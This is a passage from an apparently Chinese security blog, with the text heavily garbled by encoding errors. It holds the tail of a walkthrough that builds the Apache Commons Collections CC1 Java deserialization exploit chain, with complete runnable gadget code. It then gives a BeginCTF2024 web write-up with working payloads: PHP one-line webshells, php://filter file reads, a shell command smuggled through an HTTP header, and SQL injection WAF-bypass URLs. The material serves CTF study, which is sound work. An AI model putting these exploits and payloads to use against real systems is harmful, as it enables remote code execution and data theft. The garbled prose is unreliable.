Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedmap.entrySet())&#123; entry.setValue(r);//ç›¸å½“äºInvokerTransformer.transform(r)&#125; æ‰§è¡Œä¸Šè¿°ä»£ç å³å¯å¼¹å‡ºè®¡ç®—å™¨ï¼Œç„¶è€Œï¼Œæº¯æºè¿˜æœªç»“æŸï¼Œæˆ‘ä»¬æ¥ç€æ‰¾è°ƒç”¨äº†setValueæ–¹æ³•çš„ç±»ã€‚ 2.3 èµ·ç‚¹â€“AnnotationInvocationHandlerç±»ç»æŸ¥æ‰¾å¯å¾—ï¼š è¯¥ç±»ä¸­è°ƒç”¨setValueæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š ä¸¤ä¸ªifè¯­å¥ï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­æ³¨è§£ä¸­æ˜¯å¦æœ‰æˆå‘˜å˜é‡ï¼Œç¬¬äºŒä¸ªifåˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿå¼ºè½¬ã€‚ å¯è§æ­¤ç±»ä¸­åˆ©ç”¨çš„setValueæ–¹æ³•æ°å¥½å†™åœ¨readObjectæ–¹æ³•ä¸­ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶é‡Œè¾¹çš„å‚æ•°ï¼Œä¾¿å¯å¤§åŠŸå‘Šæˆã€‚ äºæ˜¯æˆ‘ä»¬å»æ‰¾è¯¥ç±»çš„æ„é€ å™¨ï¼š 12345678910AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; //éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªç±»å¯¹è±¡ï¼Œè¡¨ç¤ºæ³¨è§£çš„ç±»å‹ï¼›ç¬¬äºŒä¸ªå‚æ•°éœ€è¦ä¼ å…¥Mapï¼Œå› æ­¤ä¼ å…¥TransformedMapå³å¯ Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; æ¥ä¸‹æ¥ç¬¬ä¸€ä¸ªå‚æ•°çš„æ„é€ éœ€è¦ç¬¦åˆè¿™å‡ ä¸ªifæ¡ä»¶ï¼Œé¦–å…ˆï¼Œéœ€è¦æ˜¯æ³¨è§£ç±»å‹ï¼›å…¶æ¬¡ï¼Œå†…éƒ¨éœ€è¦æœ‰æˆå‘˜å˜é‡ï¼Œä»¥ä¾¿åœ¨forå¾ªç¯çš„Mapéå†ä¸­é€šè¿‡ã€‚ åƒå¸¸è§çš„Overrideæ³¨è§£ï¼š ä¸åŒ…å«ä»»ä½•æˆå‘˜å˜é‡ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬é€‰ç”¨Targetæ³¨è§£ï¼š ä¸æ­¤åŒæ—¶ï¼Œæ›´æ”¹map.put(â€œvalueâ€,â€valueâ€)ï¼Œä½¿å…¶memberTypeä¸ä¸ºç©ºã€‚ ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯AnnotationInvocationHandlerç±»å¹¶æ²¡æœ‰publicå±æ€§ï¼Œå› æ­¤ä»…èƒ½å¤Ÿåœ¨sun.reflect.annotationè¿™ä¸ªåŒ…ä¸‹è¾¹è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°åå°„æ¥å®ç°å¤–éƒ¨è°ƒç”¨ã€‚ ç»è¿‡ä¸Šè¿°æº¯æºï¼Œæˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†ä¸€æ¡é“¾ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°†å…¶ä»¥ä»£ç å½¢å¼ä¸²è”èµ·æ¥ã€‚ 3.æ„é€ é“¾3.1 åå°„è·å–Runtimeå®ä¾‹Runtimeæ˜¯å•ä¾‹ç±»ï¼Œä¸”ä¸ç»§æ‰¿Seralizeableæ¥å£ï¼Œæ— æ³•åœ¨åºåˆ—åŒ–æ—¶å†™å…¥æ–‡ä»¶ï¼Œè€Œå®ƒçš„åŸå‹ç±»Classåˆ™ç»§æ‰¿äº†Seralizeableæ¥å£ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨åå°„è·å–å…¶åŸå‹ç±»ã€‚ 12345Class rc=Class.forName(&quot;java.lang.Runtime&quot;); //è·å–ç±»åŸå‹Method getRuntime = rc.getDeclaredMethod(&quot;getRuntime&quot;,null);Runtime r = (Runtime) getRuntime.invoke(null,null);Method exec = rc.getDeclaredMethod(&quot;exec&quot;,String.class);exec.invoke(r,&quot;calc&quot;); è¿™æ ·ä¾¿å¯å®ç°åºåˆ—åŒ–ï¼Œæˆ‘ä»¬é‡‡ç”¨InvokerTransformerç±»çš„transformæ–¹æ³•å®ç°ä¸Šè¿°è¿‡ç¨‹ï¼š 1234Class rc = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = (Method)new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;getRuntime&quot;,new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 3.2 ä½¿ç”¨ChainedTransformerç±»ç®€åŒ–è¿‡ç¨‹1234567891011public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125;public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; ChainedTransformerç±»ä¸­å­˜åœ¨çš„transformæ–¹æ³•ç±»ä¼¼äºé€’å½’è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»¥æ•°ç»„çš„å½¢å¼ä¼ å…¥InvokerTransformerç±»çš„transformæ–¹æ³•å®ç°çš„è·å–Runtimeå®ä¾‹çš„è¿‡ç¨‹ï¼Œæ•…æ›´æ”¹ä»£ç å¦‚ä¸‹ï¼š 1234567Transformer[] transformers=new Transformer[]&#123; new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); ç„¶è€Œï¼Œåœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¸å¯èƒ½ç›´æ¥è°ƒç”¨chainedTransformerçš„transformæ–¹æ³•æ¥ä¼ å…¥Runtime.classã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†Runtime.classä½œä¸ºé€’å½’çš„å¼€å¤´ä¼ å…¥è¿›å»ï¼Œè€Œç›´æ¥ä¼ å…¥æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»æ¥ä½œä¸ºè½½ä½“ã€‚ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬è¿˜å¿½ç•¥äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯AnnotationInvocationHandlerç±»ä¸­çš„setValueå‚æ•°ä¸å¯æ§ã€‚ 3.3 ConstantTransformerç±»çš„å¼•å…¥å…ˆæ¥çœ‹ä¸€ä¸‹è¯¥ç±»çš„æºç ï¼š 12345678public ConstantTransformer(Object constantToReturn) &#123;//æ„é€ å™¨ super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;//transformæ–¹æ³• return iConstant;&#125; è¯¥ç±»çš„transformæ–¹æ³•å¾ˆæœ‰æ„æ€ï¼Œæ— è®ºä¼ å…¥ä½•å€¼ï¼Œå‡ä¼šè¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¸¸é‡ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†Transformeræ•°ç»„æ”¹æˆå¦‚ä¸‹ï¼š 123456Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;; 3.4 æ„é€ å®Œæˆå®Œæ•´çš„CC1é“¾å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);//åå°„è·å–AnnotationInvocationHandlerç±»Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Target.class,transformedmap);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); æˆåŠŸæ‰§è¡Œä¾¿ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼š 4.æ€è·¯è½¬æ¢æœ¬æ¬¡åˆ†æçš„CC1é“¾æ˜¯å›½å†…åŸºäºTransformerMapç±»çš„é“¾ï¼Œè€Œæˆ‘ä»¬å¸¸ç”¨çš„ysoerialä¸­çš„åˆ™æ˜¯å›½å¤–åŸºäºLazyMapçš„é“¾ï¼Œå…¶æ€è·¯å¦‚ä¸‹ï¼š payloadä¹Ÿå’Œä¹‹å‰çš„ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯å°†TransformerMapæ”¹ä¸ºäº†LazyMapï¼Œåˆ©ç”¨æ–¹æ³•ç”±checkSetValueå˜ä¸ºäº†getï¼Œå¹¶å¤šäº†ä¸€æ­¥Proxyè§¦å‘invokeæ–¹æ³•ï¼Œè‡³äºæ³¨è§£ç±»å‹ï¼Œç”±äºæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯getæ–¹æ³•ï¼Œæ‰€ä»¥ä¸éœ€è¦è¿›å…¥ifï¼Œç›´æ¥éšä¾¿ä¼ ä¸€ä¸ªæ³¨è§£å°±å¯ä»¥äº†ã€‚æœ€åä½¿ç”¨AnnotationInvocationHandlerç±»è¿›è¡ŒåŒ…è£…ï¼Œæ¯•ç«Ÿæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒçš„readObjectæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚ 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//åå°„è·å–AnnotationInvocationHandlerç±»Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"BeginCTF2024_WEB_WP","slug":"BeginCTF2024_WEB_WP","date":"2024-02-07T03:20:54.991Z","updated":"2024-02-07T03:20:32.243Z","comments":true,"path":"2024/02/07/BeginCTF2024_WEB_WP/","link":"","permalink":"http://example.com/2024/02/07/BeginCTF2024_WEB_WP/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;3 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;2&#x2F;3 åˆ†ç±»ï¼šwriteup zuploadç³»åˆ—1.è¿™ä¸€ç³»åˆ—çš„é¢˜ç›®åŸºæœ¬ä¸Šéƒ½æ˜¯è€ƒå¯Ÿç®€å•çš„ä»£ç å®¡è®¡ï¼Œè®ºéš¾åº¦åªèƒ½ç®—æ˜¯ç­¾åˆ°é¢˜ã€‚ 2.æ‰€æœ‰é¢˜ç›®å‡ä¼šå…ˆè´´å‡ºæºç ã€‚ zupload æœ¬é¢˜å¯¹actionçš„èµ‹å€¼æ— è¿‡æ»¤ï¼Œå› æ­¤å¯ç›´æ¥è¯»flagï¼Œpayload:?action=/flag zupload-pro æœ¬é¢˜ç¦æ­¢äº†ç›®å½•ç©¿è¶Šï¼Œä½†é™åˆ¶æ¡ä»¶ä¸å¤šï¼Œå¯ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚ payload:?action=php://filter/convert.base64-encode/resource=/flag base64è§£ç å³å¯ï¼šbegin{is_tHis_4_wE85heLL_069b22e704f1} zupload-pro-plus æœ¬é¢˜åšæ³•åŒä¸Šï¼Œpayload:?action=php://filter/convert.base64-encode/resource=/flag ä»æºç æ”¹åŠ¨ä¸Šæ¥çœ‹ï¼Œå‡ºé¢˜äººåº”è¯¥æ˜¯æƒ³è®©é€‰æ‰‹è¿›è¡Œåç¼€åŒå†™ç»•è¿‡ï¼Œä½†åº”è¯¥æ˜¯å‡ºé¢˜çš„æ—¶å€™ä¸ä¸¥è°¨ï¼Œå¯¼è‡´æœ‰å¤šç§åšæ³•ï¼Œå› æ­¤ä¸å†è¿‡å¤šèµ˜è¿° zupload-pro-plus-enhanced ä½œè€…åœ¨æœ¬é¢˜è¿›è¡Œäº†åŠ å›ºï¼Œåªèƒ½è¿›è¡ŒåŒå†™åç¼€çš„å½¢å¼ç»•è¿‡ æ–¹æ³•å¦‚ä¸‹ï¼š 1.ä¸€å¥è¯æœ¨é©¬&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;å†™å…¥1.php2.æ”¹åç¼€åä¸º1.zip3.ä¸Šä¼ æ—¶æ‹¦æˆªæ•°æ®åŒ…æ”¹åä¸º1.zip.php4.è®¿é—®http://ip:port/uploads/1.zip.php zupload-pro-plus-max æœ¬é¢˜è€ƒç‚¹ï¼šinclude()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ä¸è€ƒè™‘æ–‡ä»¶åç¼€ï¼Œå¹¶ä¸”ä¼šå°†æ–‡ä»¶å†…å®¹å½“ä½œphpä»£ç æ‰§è¡Œ æ–¹æ³•å¦‚ä¸‹ï¼š 1.åˆ›å»º1.txté‡Œè¾¹å†™ä¸Šphpä¸€å¥è¯æœ¨é©¬&lt;?php eval(system(&quot;cat /flag&quot;));?&gt;2.å‹ç¼©ä¸º1.zipä¸Šä¼ 3.è®¿é—®uploads&#x2F;1.zipï¼Œinclude()å‡½æ•°è‡ªåŠ¨è§£æ1.txtå†…çš„å†…å®¹å³å¯è·å–&#x2F;flag zupload-pro-plus-max-ultra æœ¬é¢˜è€ƒç‚¹ï¼š$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›é¢å¤–çš„é¡¹ç›®ã€‚ $_SERVER[â€˜PHP_SELFâ€™] å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œä¸ document root æœ‰å…³ã€‚ä¾‹å¦‚ï¼Œåœ¨åœ°å€ä¸º http://example.com/test.php/foo.bar çš„è„šæœ¬ä¸­ä½¿ç”¨ $SERVER[â€˜PHP_SELFâ€™] å°†å¾—åˆ° &#x2F;test.php&#x2F;foo.barã€‚__FILE_ å¸¸é‡åŒ…å«å½“å‰(ä¾‹å¦‚åŒ…å«)æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚ ä» PHP 4.3.0 ç‰ˆæœ¬å¼€å§‹ï¼Œå¦‚æœ PHP ä»¥å‘½ä»¤è¡Œæ¨¡å¼è¿è¡Œï¼Œè¿™ä¸ªå˜é‡å°†åŒ…å«è„šæœ¬åã€‚ä¹‹å‰çš„ç‰ˆæœ¬è¯¥å˜é‡ä¸å¯ç”¨ã€‚ $_SERVER[â€˜GATEWAY_INTERFACEâ€™] æœåŠ¡å™¨ä½¿ç”¨çš„ CGI è§„èŒƒçš„ç‰ˆæœ¬ï¼›ä¾‹å¦‚ï¼Œâ€CGI&#x2F;1.1â€ã€‚ $_SERVER[â€˜SERVER_ADDRâ€™] å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨çš„ IP åœ°å€ã€‚ $_SERVER[â€˜SERVER_NAMEâ€™] å½“å‰è¿è¡Œè„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨çš„ä¸»æœºåã€‚å¦‚æœè„šæœ¬è¿è¡Œäºè™šæ‹Ÿä¸»æœºä¸­ï¼Œè¯¥åç§°æ˜¯ç”±é‚£ä¸ªè™šæ‹Ÿä¸»æœºæ‰€è®¾ç½®çš„å€¼å†³å®šã€‚(å¦‚: www.runoob.com) $_SERVER[â€˜SERVER_SOFTWAREâ€™] æœåŠ¡å™¨æ ‡è¯†å­—ç¬¦ä¸²ï¼Œåœ¨å“åº”è¯·æ±‚æ—¶çš„å¤´ä¿¡æ¯ä¸­ç»™å‡ºã€‚ (å¦‚ï¼šApache&#x2F;2.2.24) $_SERVER[â€˜SERVER_PROTOCOLâ€™] è¯·æ±‚é¡µé¢æ—¶é€šä¿¡åè®®çš„åç§°å’Œç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œâ€HTTP&#x2F;1.0â€ã€‚ $_SERVER[â€˜REQUEST_METHODâ€™] è®¿é—®é¡µé¢ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼›ä¾‹å¦‚ï¼Œâ€GETâ€, â€œHEADâ€ï¼Œâ€POSTâ€ï¼Œâ€PUTâ€ã€‚ $_SERVER[â€˜REQUEST_TIMEâ€™] è¯·æ±‚å¼€å§‹æ—¶çš„æ—¶é—´æˆ³ã€‚ä» PHP 5.1.0 èµ·å¯ç”¨ã€‚ (å¦‚ï¼š1377687496) $_SERVER[â€˜QUERY_STRINGâ€™] query stringï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œé€šè¿‡å®ƒè¿›è¡Œé¡µé¢è®¿é—®ã€‚ $_SERVER[â€˜HTTP_ACCEPTâ€™] å½“å‰è¯·æ±‚å¤´ä¸­ Accept: é¡¹çš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯ã€‚ $_SERVER[â€˜HTTP_ACCEPT_CHARSETâ€™] å½“å‰è¯·æ±‚å¤´ä¸­ Accept-Charset: é¡¹çš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯ã€‚ä¾‹å¦‚ï¼šâ€iso-8859-1,*,utf-8â€ã€‚ $_SERVER[â€˜HTTP_HOSTâ€™] å½“å‰è¯·æ±‚å¤´ä¸­ Host: é¡¹çš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯ã€‚ $_SERVER[â€˜HTTP_REFERERâ€™] å¼•å¯¼ç”¨æˆ·ä»£ç†åˆ°å½“å‰é¡µçš„å‰ä¸€é¡µçš„åœ°å€ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ç”± user agent è®¾ç½®å†³å®šã€‚å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”¨æˆ·ä»£ç†éƒ½ä¼šè®¾ç½®è¯¥é¡¹ï¼Œæœ‰çš„è¿˜æä¾›äº†ä¿®æ”¹ HTTP_REFERER çš„åŠŸèƒ½ã€‚ç®€è¨€ä¹‹ï¼Œè¯¥å€¼å¹¶ä¸å¯ä¿¡ã€‚) $_SERVER[â€˜HTTPSâ€™] å¦‚æœè„šæœ¬æ˜¯é€šè¿‡ HTTPS åè®®è¢«è®¿é—®ï¼Œåˆ™è¢«è®¾ä¸ºä¸€ä¸ªéç©ºçš„å€¼ã€‚ $_SERVER[â€˜REMOTE_ADDRâ€™] æµè§ˆå½“å‰é¡µé¢çš„ç”¨æˆ·çš„ IP åœ°å€ã€‚ $_SERVER[â€˜REMOTE_HOSTâ€™] æµè§ˆå½“å‰é¡µé¢çš„ç”¨æˆ·çš„ä¸»æœºåã€‚DNS åå‘è§£æä¸ä¾èµ–äºç”¨æˆ·çš„ REMOTE_ADDRã€‚ $_SERVER[â€˜REMOTE_PORTâ€™] ç”¨æˆ·æœºå™¨ä¸Šè¿æ¥åˆ° Web æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ç«¯å£å·ã€‚ $_SERVER[â€˜SCRIPT_FILENAMEâ€™] å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„ã€‚ $_SERVER[â€˜SERVER_ADMINâ€™] è¯¥å€¼æŒ‡æ˜äº† Apache æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­çš„ SERVER_ADMIN å‚æ•°ã€‚å¦‚æœè„šæœ¬è¿è¡Œåœ¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸Šï¼Œåˆ™è¯¥å€¼æ˜¯é‚£ä¸ªè™šæ‹Ÿä¸»æœºçš„å€¼ã€‚(å¦‚ï¼š&#115;&#x6f;&#109;&#101;&#111;&#110;&#101;&#x40;&#x72;&#117;&#x6e;&#111;&#111;&#x62;&#46;&#99;&#111;&#x6d;) $_SERVER[â€˜SERVER_PORTâ€™] Web æœåŠ¡å™¨ä½¿ç”¨çš„ç«¯å£ã€‚é»˜è®¤å€¼ä¸º â€œ80â€ã€‚å¦‚æœä½¿ç”¨ SSL å®‰å…¨è¿æ¥ï¼Œåˆ™è¿™ä¸ªå€¼ä¸ºç”¨æˆ·è®¾ç½®çš„ HTTP ç«¯å£ã€‚ $_SERVER[â€˜SERVER_SIGNATUREâ€™] åŒ…å«äº†æœåŠ¡å™¨ç‰ˆæœ¬å’Œè™šæ‹Ÿä¸»æœºåçš„å­—ç¬¦ä¸²ã€‚ $_SERVER[â€˜PATH_TRANSLATEDâ€™] å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿï¼ˆéæ–‡æ¡£æ ¹ç›®å½•ï¼‰çš„åŸºæœ¬è·¯å¾„ã€‚è¿™æ˜¯åœ¨æœåŠ¡å™¨è¿›è¡Œè™šæ‹Ÿåˆ°çœŸå®è·¯å¾„çš„æ˜ åƒåçš„ç»“æœã€‚ $_SERVER[â€˜SCRIPT_NAMEâ€™] åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ã€‚è¿™åœ¨é¡µé¢éœ€è¦æŒ‡å‘è‡ªå·±æ—¶éå¸¸æœ‰ç”¨ã€‚FILE å¸¸é‡åŒ…å«å½“å‰è„šæœ¬(ä¾‹å¦‚åŒ…å«æ–‡ä»¶)çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚ $_SERVER[â€˜SCRIPT_URIâ€™] URI ç”¨æ¥æŒ‡å®šè¦è®¿é—®çš„é¡µé¢ã€‚ä¾‹å¦‚ â€œ&#x2F;index.htmlâ€ã€‚ ï¼ˆä»¥ä¸Šå†…å®¹å‡æ¥è‡ªèœé¸Ÿï¼šPHP è¶…çº§å…¨å±€å˜é‡ | èœé¸Ÿæ•™ç¨‹ (runoob.com)ï¼‰ æ–¹æ³•å¦‚ä¸‹ï¼š 1.burpæŠ“åŒ…ï¼Œåœ¨httpå¤´ä¸­æ·»åŠ X-Extract-To:.;cp &#x2F;flag . &#x2F;uploads&#x2F; 2.è®¿é—®http://ip:port/uploads/flag zupload-pro-plus-max-ultra-premium æœ¬é¢˜è€ƒç‚¹ï¼šè½¯é“¾æ¥ è½¯é“¾æ¥å¯ä»¥çœ‹æˆæ˜¯Windowsç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼ï¼Œå¯ä»¥è®©ä½ å¿«é€Ÿé“¾æ¥åˆ°ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•ï¼Œå®ƒæ‰¾åˆ°çš„æ˜¯åŸæ–‡ä»¶åï¼Œé€šè¿‡åŸæ–‡ä»¶åæ‰¾åˆ°çœŸå®çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸”è½¯è¿æ¥æœ¬èº«æœ‰è‡ªå·±çš„indoe æ–¹æ³•å¦‚ä¸‹ï¼š 1.ln -s &#x2F;flag flagåˆ›å»ºè½¯è¿æ¥æ–‡ä»¶ 2.å°†æ–‡ä»¶å‹ç¼©ä¸ºzipæ ¼å¼ä¸Šä¼  3.è®¿é—®&#x2F;uploads&#x2F;flagå³å¯è®¿é—®åˆ°&#x2F;flag zupload-pro-revenge æœ¬é¢˜è€ƒç‚¹ï¼šå‰ç«¯æ ¡éªŒç»•è¿‡ï¼ˆPSï¼šä»»ä½•å‰ç«¯æ ¡éªŒéƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼‰ æ–¹æ³•å¦‚ä¸‹ï¼š 1.ä¸€å¥è¯æœ¨é©¬&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;å†™å…¥1.php2.æ”¹åç¼€åä¸º1.zip3.ä¸Šä¼ æ—¶æ‹¦æˆªæ•°æ®åŒ…æ”¹åä¸º1.php4.è®¿é—®http://ip:port/uploads/1.php sqlæ•™å­¦å±€å•çº¯çš„sql wafç»•è¿‡ï¼Œæ²¡ä»€ä¹ˆæŠ€æœ¯å«é‡ flagåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œä¾æ¬¡æ‹¿å°±æ˜¯äº† payloadå¦‚ä¸‹ï¼š 1231.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(flag)/**/frfromom/**/secret.passwoorrd%232.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(student,%27~%27,grade)/**/frfromom/**/scoorre/**/where/**/student/**/like/**/%27begin%27%233.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/loloadad_file(&#x27;/flag&#x27;)%23 POPgadgetè€ƒå¯Ÿphpååºåˆ—åŒ–ï¼Œè¿™ä¸ªé¢˜ç›®æœ‰ç‚¹å‘äººï¼Œflagåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œç›´æ¥çœ‹phpinfoå°±å¯ä»¥äº†ï¼Œè€—è´¹äº†å¾ˆå¤šæ—¶é—´ 